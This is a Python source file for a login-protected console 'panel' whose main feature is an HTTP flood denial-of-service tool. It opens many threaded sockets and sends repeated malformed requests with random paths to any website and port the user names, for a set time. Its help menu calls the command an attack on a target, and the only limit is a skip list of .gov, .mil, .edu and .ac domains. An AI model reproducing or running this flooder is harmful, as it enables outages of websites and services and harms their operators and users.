# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    import requests
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . . ")
    exit()

# DEF & CLASS

username = ''
password = ''

def login_checker(username,password):
    credentials = [x.strip() for x in open(f'{os.path.dirname(__file__)}/login.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split('@')
        if c_username.upper()  == username.upper() and c_password.upper() == password.upper():
            return True

def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data
    
def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

# DOS
def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet):
    url_path = ''
    path_get = ['PY_FLOOD','CHOICES_FLOOD']
    path_get_loader = random.choice((path_get))
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        elif data_type_loader_packet == 'OWN1':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
        elif data_type_loader_packet == 'OWN2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
        elif data_type_loader_packet == 'OWN3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
        elif data_type_loader_packet == 'OWN4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
        elif data_type_loader_packet == 'OWN5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
        elif data_type_loader_packet == 'OWN6':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n".encode()
        elif data_type_loader_packet == 'OWN7':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r".encode()
        elif data_type_loader_packet == 'OWN8':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r".encode()
        elif data_type_loader_packet == 'TEST':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\n\r\r\n\r\n\n\n".encode()
        s.connect((ip,port))
        for _ in range(booter_sent):
            s.sendall(packet_data)
            s.send(packet_data)
    except:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass

status_code = False
def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
    global status_code
    if status_code == True:
        while time.time() < time_loader:
            for _ in range(spam_loader):
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
    else:
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
prefix_get = "!"
status_help_type = 0
def command():
    global status_help_type,status_code,prefix_get,username,password
    if status_help_type == 0:
        print(f"{Fore.LIGHTYELLOW_EX}         __..---..__\n{Fore.YELLOW}     ,-='  {Fore.RED}/  |  \{Fore.YELLOW}  `=-.\n{Fore.LIGHTWHITE_EX}    :--..___________..--;\n{Fore.WHITE}     \.,_____________,./ \n{Fore.RED}   ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐\n{Fore.LIGHTRED_EX}   ╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ \n{Fore.WHITE}   ╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘\n {Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.WHITE}< {Fore.LIGHTGREEN_EX}TYPE {prefix_get}HELP FOR SHOW COMMAND {Fore.WHITE}> {Fore.RESET}")
        status_help_type += 1
    else:
        pass

    data_input_loader = input(f"{Fore.CYAN}{username}{Fore.WHITE}@{Fore.BLUE}{password} {Fore.WHITE}${Fore.RESET}")
    args_get = data_input_loader.split(" ")
    if args_get[0].upper() == f"{prefix_get}CREDIT":
        print(f"{Fore.YELLOW}         __..---..__\n{Fore.YELLOW}     ,-='  {Fore.RED}/  |  \{Fore.YELLOW}  `=-.\n{Fore.LIGHTWHITE_EX}    :--..___________..--;\n{Fore.WHITE}     \.,_____________,./ \n{Fore.LIGHTYELLOW_EX}   ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗{Fore.RED}┌─┐┬┌─┐\n{Fore.YELLOW}   ╚═╗║ ║║  ╠╩╗║╣  ║{Fore.LIGHTRED_EX} ├─┘│├┤ \n{Fore.LIGHTRED_EX}   ╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩{Fore.WHITE}o{Fore.LIGHTYELLOW_EX}┴  ┴└─┘\n\n{Fore.LIGHTMAGENTA_EX}CREDIT {Fore.WHITE}- {Fore.LIGHTBLUE_EX}ART {Fore.WHITE}: {Fore.CYAN}Riitta Rasimus {Fore.WHITE}- {Fore.LIGHTCYAN_EX}ascii.co.uk/art/pie {Fore.WHITE}|{Fore.GREEN} DEV {Fore.WHITE}- {Fore.LIGHTGREEN_EX}github.com/Hex1629{Fore.RESET}")
    elif args_get[0].upper() == f"{prefix_get}HELP":
        print(f"{Fore.GREEN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━┓\n┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━┫\n{Fore.LIGHTGREEN_EX}┃ HELP COMMAND . menu                                ┃\n{Fore.GREEN}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n   {Fore.RED}{prefix_get}HELP         {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For show command\n   {Fore.RED}{prefix_get}CREDIT       {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For show credit\n   {Fore.RED}{prefix_get}CLS          {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For clear all screen\n   {Fore.RED}{prefix_get}MENU         {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For return to menu\n   {Fore.RED}{prefix_get}PREFIX_SET   {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For set prefix\n   {Fore.RED}{prefix_get}FLOOD        {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For attack target with http flood\n   {Fore.RED}{prefix_get}PING_URL     {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For ping test with url\n   {Fore.RED}{prefix_get}PING_TCP     {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For ping test with tcp\n   {Fore.RED}{prefix_get}EXIT         {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For exit from panel\n{Fore.GREEN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{Fore.RESET}")
    elif args_get[0].upper() == f"{prefix_get}PREFIX_SET":
        if len(args_get) == 2:
            prefix_get = args_get[1]
            clear_text()
            print(f"{Fore.LIGHTYELLOW_EX}         __..---..__\n{Fore.YELLOW}     ,-='  {Fore.RED}/  |  \{Fore.YELLOW}  `=-.\n{Fore.LIGHTWHITE_EX}    :--..___________..--;\n{Fore.WHITE}     \.,_____________,./ \n{Fore.RED}   ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐\n{Fore.LIGHTRED_EX}   ╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ \n{Fore.WHITE}   ╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘\n {Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.WHITE}< {Fore.LIGHTGREEN_EX}TYPE {prefix_get}HELP FOR SHOW COMMAND {Fore.WHITE}> {Fore.RESET}")
        else:
            print(f"{Fore.YELLOW}{prefix_get}PREFIX_SET <PREFIX>{Fore.RESET}")
    elif args_get[0].upper() == f"{prefix_get}CLEAR" or args_get[0].upper() == f"{prefix_get}CLS":
        clear_text()
    elif args_get[0].upper() == f"{prefix_get}MENU":
        clear_text()
        print(f"{Fore.LIGHTYELLOW_EX}         __..---..__\n{Fore.YELLOW}     ,-='  {Fore.RED}/  |  \{Fore.YELLOW}  `=-.\n{Fore.LIGHTWHITE_EX}    :--..___________..--;\n{Fore.WHITE}     \.,_____________,./ \n{Fore.RED}   ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐\n{Fore.LIGHTRED_EX}   ╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ \n{Fore.WHITE}   ╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘\n {Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.WHITE}< {Fore.LIGHTGREEN_EX}TYPE {prefix_get}HELP FOR SHOW COMMAND {Fore.WHITE}> {Fore.RESET}")
    elif args_get[0].upper() == f"{prefix_get}EXIT":
        print(f"{Fore.LIGHTGREEN_EX}EXIT . . .{Fore.RESET}")
        try:
            exit()
        except:
            sys.exit()
    elif args_get[0].upper() == f"{prefix_get}PING_URL":
        if len(args_get) == 2:
            status_code_leak = ''
            try:
                a = time.time()
                url = args_get[1]
                req = requests.get(url)
                b = time.time()
                status_code_leak = "OK"
            except:
                c = time.time()
                status_code_leak = 'NO'
            if status_code_leak == "OK":
                print(f"{Fore.BLUE}STATUS_CODE{Fore.WHITE}={Fore.LIGHTBLUE_EX}{req.status_code}:{req.reason} {Fore.CYAN}REQUESTS{Fore.WHITE}={Fore.LIGHTCYAN_EX}{a} MS {Fore.YELLOW}RESPONSE{Fore.WHITE}={Fore.LIGHTYELLOW_EX}{b} MS {Fore.RED}PING{Fore.WHITE}={Fore.LIGHTRED_EX}{a-b} MS{Fore.RESET}")
            else:
                print(f"{Fore.BLUE}STATUS_CODE{Fore.WHITE}={Fore.LIGHTBLUE_EX}CAN'T CONNECT {Fore.CYAN}REQUESTS{Fore.WHITE}={Fore.LIGHTCYAN_EX}{a} MS {Fore.YELLOW}RESPONSE{Fore.WHITE}={Fore.LIGHTYELLOW_EX}NULL MS {Fore.RED}PING{Fore.WHITE}={Fore.LIGHTRED_EX}NULL MS{Fore.RESET}")
        else:
            print(f"{Fore.LIGHTRED_EX}{prefix_get}PING_URL {Fore.RED}<URL>{Fore.RESET}")
            print(f"{Fore.LIGHTRED_EX}HEY IF YOU DDOS/DOS TO TARGET IF STRAIGHT WEBSITE\n{Fore.YELLOW}ITS MAKE PINGER STOP IF STOP YOU CAN CLOSE PYTHON ONLY AND NEXT OPEN AGAIN (OK)\n{Fore.RED}NOT BUG YOU KNOW? | [BECAUSE I CAN'T FIX]{Fore.RESET}")
    elif args_get[0].upper() == f"{prefix_get}PING_TCP":
        if len(args_get) == 3:
            status_code_leak = ''
            ip_tar = str(args_get[1])
            port_tar = int(args_get[2])
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            try:
                a = time.time()
                s.connect((ip_tar,port_tar))
                b = time.time()
                status_code_leak = "OK"
            except:
                c = time.time()
                status_code_leak = 'NO'
            s.close()
            if status_code_leak == "OK":
                print(f"{Fore.BLUE}STATUS_CODE{Fore.WHITE}={Fore.LIGHTBLUE_EX}CONNECT {Fore.CYAN}REQUESTS{Fore.WHITE}={Fore.LIGHTCYAN_EX}{a} MS {Fore.YELLOW}RESPONSE{Fore.WHITE}={Fore.LIGHTYELLOW_EX}{b} MS {Fore.RED}PING{Fore.WHITE}={Fore.LIGHTRED_EX}{a-b} MS{Fore.RESET}")
            else:
                print(f"{Fore.BLUE}STATUS_CODE{Fore.WHITE}={Fore.LIGHTBLUE_EX}CAN'T CONNECT {Fore.CYAN}REQUESTS{Fore.WHITE}={Fore.LIGHTCYAN_EX}{a} MS {Fore.YELLOW}RESPONSE{Fore.WHITE}={Fore.LIGHTYELLOW_EX}NULL MS {Fore.RED}PING{Fore.WHITE}={Fore.LIGHTRED_EX}NULL MS{Fore.RESET}")
        else:
            print(f"{Fore.LIGHTRED_EX}{prefix_get}PING_TCP {Fore.RED}<IP> <PORT>{Fore.RESET}")
    elif args_get[0].upper() == f"{prefix_get}FLOOD":
        if len(args_get) == 10:
            data_type_loader_packet = args_get[1].upper()
            target_loader = args_get[2]
            port_loader = int(args_get[3])
            time_loader = time.time() + int(args_get[4])
            spam_loader = int(args_get[5])
            create_thread = int(args_get[6])
            booter_sent = int(args_get[7])
            methods_loader = args_get[8]
            spam_create_thread = int(args_get[9])
            code_leak = True
            host = ''
            ip = ''
            try:
                host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                if '.gov' in host or '.mil' in host or '.edu' in host or '.ac' in host:
                    code_leak = False
                    print(f"{Fore.GREEN}Uhh You Can't Attack This Website {Fore.WHITE}[ {Fore.YELLOW}.gov .mil .edu .ac {Fore.WHITE}] . . .{Fore.RESET}")
                else:
                    ip = socket.gethostbyname(host)
                    code_leak = True
            except socket.gaierror:
                code_leak = False
                print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
            if code_leak == True:
             for loader_num in range(create_thread):
                sys.stdout.write(f"\r {Fore.YELLOW}{loader_num}% CREATE THREAD . . .{Fore.RESET}")
                sys.stdout.flush()
                for _ in range(spam_create_thread):
                  threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
             clear_text()
             status_code = True
             print(f"{Fore.LIGHTCYAN_EX}Sending Packet {Fore.CYAN}HTTP FLOOD {Fore.LIGHTCYAN_EX}To Target {Fore.WHITE}!\n\n{Fore.YELLOW}    ━╦━━━━━━━━━━━━━━━━━━━━━╦━\n{Fore.LIGHTYELLOW_EX}╚═══╦╩═════════════════════╩╦═══╝\n{Fore.WHITE}       ━ ━ ━ {Fore.LIGHTGREEN_EX}SENDING {Fore.WHITE}━ ━ ━  \n{Fore.LIGHTRED_EX}  ╔═╩═══════════════════════╩═╗\n     {Fore.GREEN}Target: {target_loader}\n       {Fore.GREEN}Port: {port_loader}\n       {Fore.GREEN}Type: {data_type_loader_packet}\n{Fore.RED}  ╚═══════════════════════════╝\n      {Fore.BLUE}@DEV {Fore.WHITE}- {Fore.LIGHTBLUE_EX}Hex1629{Fore.RESET}")
        else:
            print(f"{Fore.RED}{prefix_get}FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
            print(f"{Fore.CYAN}TYPE_PACKET --> {Fore.WHITE}[ {Fore.LIGHTBLUE_EX}PYF {Fore.WHITE}| TEST TEST2 {Fore.WHITE}| {Fore.BLUE}OWN1 OWN2 OWN3 OWN4 OWN5 OWN6 OWN7 {Fore.WHITE}]\n {Fore.WHITE}[+] {Fore.LIGHTCYAN_EX}TIME (EXAMPLE=250)\n {Fore.WHITE}[+] {Fore.GREEN}SPAM_THREAD (EXAMPLE=299)\n {Fore.WHITE}[+] {Fore.LIGHTGREEN_EX}CREATE_THREAD (EXAMPLE=5)\n {Fore.WHITE}[+] {Fore.LIGHTYELLOW_EX}HTTP_METHODS (EXAMPLE=GATEWAY)\n {Fore.WHITE}[+] {Fore.YELLOW}SPAM_CREATE (EXAMPLE=15){Fore.RESET}")
    else:
        print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
    command()
def checker_login():
    global username,password
    clear_text()
    print(f"{Fore.LIGHTYELLOW_EX}         __..---..__\n{Fore.YELLOW}     ,-='  {Fore.RED}/  |  \{Fore.YELLOW}  `=-.\n{Fore.LIGHTWHITE_EX}    :--..___________..--;\n{Fore.WHITE}     \.,_____________,./ \n{Fore.RED}   ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐\n{Fore.LIGHTRED_EX}   ╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ \n{Fore.WHITE}   ╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘{Fore.RESET}")
    time.sleep(0.5)
    username = input(f"{Fore.CYAN}USERNAME {Fore.WHITE}${Fore.RESET}")
    time.sleep(0.5)
    password = input(f"{Fore.BLUE}PASSWORD {Fore.WHITE}${Fore.RESET}")
    time.sleep(0.5)
    print(F"{Fore.BLUE}LOGIN TO PANEL {Fore.WHITE}({Fore.LIGHTBLUE_EX}TRYING LOGIN WITH {username}@{password}{Fore.WHITE}) . . .{Fore.RESET}")
    time.sleep(int(random.randint(1,3)))
    if login_checker(username,password) == True:
     print(f"{Fore.CYAN}PANEL LOADING . . .{Fore.RESET}")
     time.sleep(1)
     clear_text()
     command()
    else:
     print(f"{Fore.RED}FAILED {Fore.YELLOW}LOGIN . . .{Fore.RESET}")
     time.sleep(1)
     checker_login()
checker_login()
